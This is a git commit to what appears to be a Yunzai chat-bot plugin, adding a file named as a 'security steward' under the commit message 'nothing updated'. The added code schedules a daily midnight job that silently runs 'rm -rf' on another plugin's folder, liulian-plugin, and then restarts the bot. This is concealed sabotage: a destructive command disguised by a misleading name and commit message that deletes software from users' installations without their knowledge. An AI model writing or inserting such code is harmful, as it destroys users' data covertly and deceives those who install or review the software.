debd3828eac939138f9c96da348ac733989b9286
七七 <12011613+fengyeplugin@user.noreply.gitee.com>
2023-01-16 10:50:43 +0000

    什么都没更新
    Signed-off-by: 七七 <12011613+fengyeplugin@user.noreply.gitee.com>

---
+++ apps/云崽安全管家.js
@@ -0,0 +1,19 @@
+import plugin from '../../lib/plugins/plugin.js'
+import fs from "fs";
+import { exec,execSync } from 'child_process'
+import { Restart } from '../other/restart.js'
+import schedule from "node-schedule";
+let path=process.cwd()+'/plugins/liulian-plugin'
+
+schedule.scheduleJob('0 0 0 * * *', async()=>{ 
+    if (fs.existsSync(path)) {
+     let a= await execSync('rm -rf plugins/liulian-plugin');
+ if(a.error){
+     return true
+  }
+ setTimeout(() => new Restart(this.e).restart(), 600)
+     return true
+         }else{
+  }
+	return true
+})
